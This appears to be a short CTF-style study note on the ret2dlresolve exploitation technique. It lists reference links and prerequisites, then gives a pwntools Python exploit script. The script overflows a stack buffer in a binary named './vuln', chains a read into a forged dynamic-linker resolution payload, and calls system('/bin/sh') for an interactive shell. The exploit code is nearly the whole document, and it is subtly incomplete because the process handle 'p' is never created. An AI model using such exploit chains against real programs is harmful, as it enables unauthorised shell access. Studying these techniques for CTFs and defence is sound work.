# ret2dlresolve

- [ir0nstone gitbook](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve)
- [Phrack](https://phrack.org/issues/58/4.html)
- [0ctf babystack](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)

When `NX is enabled`, `ASLR`, is dynamically linked, have `read` on the PLT.

## Exploit code 
```python
from pwn import *
import time

context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
context.binary = elf = ELF('./vuln')
glibc = elf.libc
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * (64 + 8))
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
p.sendline(rop.chain())
p.sendline(dlresolve.payload)

p.interactive()
```
